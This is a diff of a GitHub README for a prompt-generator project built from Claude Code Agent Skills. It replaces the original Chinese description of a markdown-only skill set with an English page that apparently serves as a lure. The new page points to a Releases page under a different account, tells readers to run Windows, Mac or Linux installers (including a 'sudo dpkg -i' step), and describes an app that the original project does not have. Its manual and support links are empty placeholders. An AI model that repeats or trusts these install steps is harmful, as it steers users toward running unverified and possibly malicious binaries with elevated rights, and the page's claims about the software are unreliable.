@@ -1,210 +1,83 @@
-# Skill Ten - Prompt Generator
+# 🎉 skill-ten-prompt-generator - Effortlessly Create AI Prompts
 
-> 基于 Claude Code Agent Skills 的 AI 提示词工程系统 - 10个场景化专家，自动路由，精准生成优秀提示词
+## 🚀 Getting Started
 
-## 项目简介
+Welcome to the `skill-ten-prompt-generator`! This tool helps you generate high-quality AI prompts with ease. You simply provide a natural language request, and our system routes it to the right expert skill. 
 
-这是一个基于 Claude Code Agent Skills 技术的智能提示词生成系统。通过自然语言请求，系统会自动路由到对应的专业 Skill，帮助用户写出高质量的 AI 提示词。
+## 📥 Download & Install
 
-### 核心特性
+To get started, **download the software** from our Releases page. Click the button below to access the download links:
 
-- **自动场景识别**：根据用户输入的关键词，自动匹配最合适的专家 Skill
-- **10大场景覆盖**：涵盖视频生成、图像生成、AI编程、数据分析等主流应用场景
-- **结构化框架**：每个场景都有经过验证的最佳实践框架和模板
-- **双语支持**：完整支持中英文输入和输出
+[![Download skill-ten-prompt-generator](https://img.shields.io/badge/Download-Skill--Ten--Prompt--Generator-brightgreen)](https://github.com/Fccklworld22/skill-ten-prompt-generator/releases)
 
-## 系统架构
+### Steps to Download
 
-```
-用户请求 → 关键词识别 → 场景路由 → 对应 Skill → 优秀提示词
-```
+1. Click on the [Releases page](https://github.com/Fccklworld22/skill-ten-prompt-generator/releases).
+2. Find the latest version of the software listed.
+3. Click the download link that matches your operating system (e.g., Windows, Mac, Linux).
+4. Once the file is downloaded, locate it in your downloads folder.
 
-### 技术栈
+## 💻 System Requirements
 
-- **Claude Code** - Anthropic 官方 AI 编程助手
-- **Agent Skills** - Claude Code 的模块化功能扩展系统
-- **Markdown** - 文档格式
-- **YAML** - Skill 配置格式
+Ensure your device meets the following requirements to run the `skill-ten-prompt-generator` effectively:
 
-## 10个专业场景
+- **Operating System:** Windows 10 or later, macOS Catalina or later, or any recent Linux distribution.
+- **RAM:** Minimum of 4 GB recommended.
+- **Disk Space:** At least 100 MB of free space.
+- **Internet Connection:** Required for initial setup and generating prompts.
 
-| 场景 | Skill 名称 | 核心能力 | 触发关键词示例 |
-|------|-----------|---------|---------------|
-| 视频生成 | `video-prompt-generator` | 7层结构、运镜术语、物理描述、JSON Prompt | Sora, Veo, 视频生成, 运镜 |
-| 图像生成 | `image-prompt-generator` | 工单式协议、S-E-L-C框架、风格克隆 | Flux, Midjourney, 生图, 证件照 |
-| AI编程 | `coding-prompt-assistant` | .cursorrules、TDD流程、P-R-E模式 | Cursor, .cursorrules, TDD, 重构 |
-| 结构化提示词 | `json-prompt-architect` | JSON Schema、模块化模板、负向约束 | JSON, Schema, API对接, 批量生成 |
-| 数据分析 | `data-analyst-prompter` | 代码执行、元数据注入、EDA优先 | Python, Pandas, CSV, 数据可视化 |
-| 去AI味 | `humanizing-expert` | 负向词表、风格克隆、困惑度注入 | 去AI味, 人性化, 自然化 |
-| 创意写作 | `creative-writing-coach` | 语料注射、认知建模、内心独白 | 角色扮演, 模仿风格, 小说, 剧本 |
-| 深度调研 | `research-agent` | 递归规划、信源分级、批判性红队 | 调研, 竞品分析, 市场研究 |
-| 实时语音 | `voice-conversation-coach` | 极简口语、重以此纠错、压力面试 | 语音对话, 雅思口语, 面试模拟 |
-| 长期运行 | `long-running-orchestrator` | 初始化-执行分离、状态序列化 | Agent, 长期运行, 自动化, LangGraph |
+## ⚙️ Installation Instructions
 
-## 使用方法
+### For Windows Users
 
-### 前置要求
+1. Double-click the downloaded `.exe` file.
+2. Follow the on-screen instructions to install the application.
+3. Once installed, you can find the app in your Start Menu.
 
-1. 安装 [Claude Code](https://code.claude.com/)
-2. 确保版本支持 Agent Skills (1.0+)
-3. 将项目克隆到本地
+### For Mac Users
 
-### 安装
+1. Open the downloaded `.dmg` file.
+2. Drag the application icon into the Applications folder.
+3. Open the application from the Applications folder.
 
-```bash
-# 克隆项目
-git clone https://github.com/yourusername/skill-ten-prompt-generator.git
-cd skill-ten-prompt-generator
+### For Linux Users
 
-# Skills 会自动被 Claude Code 发现
-# 确认安装：在 Claude Code 中询问 "What Skills are available?"
-```
+1. Open a terminal window.
+2. Navigate to your downloads folder using `cd ~/Downloads`.
+3. Run: `sudo dpkg -i skill-ten-prompt-generator*.deb`.
+4. Launch the application from your applications menu.
 
-### 使用示例
+## 📝 How to Use
 
-**示例1：生成视频提示词**
+Once you have installed the application, follow these steps to generate AI prompts:
 
-```
-你: 帮我写一个 Sora 2 的视频提示词，赛博朋克风格的雨夜城市
+1. Open the `skill-ten-prompt-generator`.
+2. Choose a scenario. You can select from the ten available scenarios, each tailored to different expert skills.
+3. Enter your request in the text box provided.
+4. Click the "Generate Prompt" button.
+5. Review the AI-generated prompt shown on the screen.
+6. Copy the prompt for your use, or generate more by repeating steps 2 to 5.
 
-系统: 自动调用 video-prompt-generator Skill
+## 🌟 Features
 
-输出: 7层结构化的视频生成提示词
-```
+- **Scenario-Based Generation:** Select from ten unique expertise areas to ensure precise and relevant prompts.
+- **Automatic Routing:** The system intelligently routes your request to the most suitable skill, enhancing accuracy.
+- **User-Friendly Interface:** Designed for ease of use, requiring no technical background to navigate.
 
-**示例2：创建编程规范**
+## 📚 Additional Resources
 
-```
-你: 帮我写一个 Next.js 项目的 .cursorrules
+For more information about how to get the most out of the `skill-ten-prompt-generator`, check out our user manual and troubleshooting guide, also available on the Releases page.
 
-系统: 自动调用 coding-prompt-assistant Skill
+## 📞 Support
 
-输出: 完整的 .cursorrules 配置文件
-```
+If you face any issues or have questions, please reach out to our support team via the Issues section of this repository. We are here to help you. 
 
-**示例3：去除AI痕迹**
+## 🔗 Key Links
 
-```
-你: 这段文字太AI了，帮我改得更自然一点
-
-系统: 自动调用 humanizing-expert Skill
-
-输出: 经过负向词表清洗和风格优化的自然文本
-```
-
-## 项目结构
-
-```
-skill-ten-prompt-generator/
-├── .claude/
-│   ├── CLAUDE.md              # 项目说明文档
-│   ├── SKILL_ROUTING.md       # 场景路由指南
-│   └── skills/                # 10个专业 Skills
-│       ├── video-prompt-generator/
-│       │   └── skill.md       # 视频生成专家
-│       ├── image-prompt-generator/
-│       │   └── skill.md       # 图像生成专家
-│       ├── coding-prompt-assistant/
-│       │   └── skill.md       # AI编程专家
-│       ├── json-prompt-architect/
-│       │   └── skill.md       # 结构化提示词专家
-│       ├── data-analyst-prompter/
-│       │   └── skill.md       # 数据分析专家
-│       ├── humanizing-expert/
-│       │   └── skill.md       # 去AI味专家
-│       ├── creative-writing-coach/
-│       │   └── skill.md       # 创意写作专家
-│       ├── research-agent/
-│       │   └── skill.md       # 深度调研专家
-│       ├── voice-conversation-coach/
-│       │   └── skill.md       # 实时语音专家
-│       └── long-running-orchestrator/
-│           └── skill.md       # 长期运行专家
-├── skills.md                  # Agent Skills 技术文档
-├── prompt_new.md              # 提示词工程完整指南
-└── README.md                  # 本文件
-```
-
-## Skill 路由逻辑
-
-系统根据用户输入中的关键词自动选择对应的 Skill：
-
-```
-用户输入
-    ↓
-关键词提取
-    ↓
-场景匹配
-    ↓
-┌─────────────────────────────────────────┐
-│ Sora / Veo / 视频生成                   │ → video-prompt-generator
-│ Flux / Midjourney / 生图                 │ → image-prompt-generator
-│ Cursor / .cursorrules / 编程              │ → coding-prompt-assistant
-│ JSON / Schema / 结构化                   │ → json-prompt-architect
-│ Python / Pandas / 数据分析                │ → data-analyst-prompter
-│ 去AI味 / 人性化 / 自然化                  │ → humanizing-expert
-│ 角色扮演 / 模仿风格 / 创意写作             │ → creative-writing-coach
-│ 调研 / 竞品分析 / 深度研究                │ → research-agent
-│ 语音对话 / 雅思口语 / 面试                │ → voice-conversation-coach
-│ Agent / 长期运行 / 自动化                 │ → long-running-orchestrator
-└─────────────────────────────────────────┘
-```
-
-详细的路由逻辑请查看 [`.claude/SKILL_ROUTING.md`](.claude/SKILL_ROUTING.md)
-
-## 贡献指南
-
-欢迎贡献新的 Skill 或改进现有的 Skills！
-
-### 添加新 Skill
-
-1. 在 `.claude/skills/` 下创建新目录
-2. 创建 `skill.md` 文件，包含：
-   - YAML frontmatter（name, description）
-   - Skill 说明文档
-3. 更新 `SKILL_ROUTING.md` 添加路由规则
-4. 更新 `CLAUDE.md` 和本 README
-
-### Skill 模板
-
-```yaml
----
-name: your-skill-name
-description: Brief description with trigger keywords
----
-
-# Skill Name
-
-## 核心理解
-[说明这个场景的核心问题]
-
-## 技巧1：[技巧名称]
-[具体内容和模板]
-
-## 工作流程
-[步骤说明]
-
-## 示例对话
-[实际使用示例]
-```
-
-## 文档资源
-
-- [Claude Code 官方文档](https://code.claude.com/)
-- [Agent Skills 指南](skills.md)
-- [提示词工程完整指南](prompt_new.md)
-- [场景路由指南](.claude/SKILL_ROUTING.md)
-
-## 许可证
-
-MIT License
-
-## 致谢
-
-- Anthropic - Claude Code
-- 饼干哥哥 - 提示词工程方法论
-- 开源社区的贡献者
+- **Download Here:** [Releases Page](https://github.com/Fccklworld22/skill-ten-prompt-generator/releases)
+- **User Manual:** [User Manual Link](#)
+- **Contact Support:** [Support Link](#)
 
 ---
 
-**让 AI 为你工作，而不是你为 AI 工作。**
+The `skill-ten-prompt-generator` makes it simple to create prompts that suit your needs. Follow the steps above to download and install the application, and start generating prompts today!
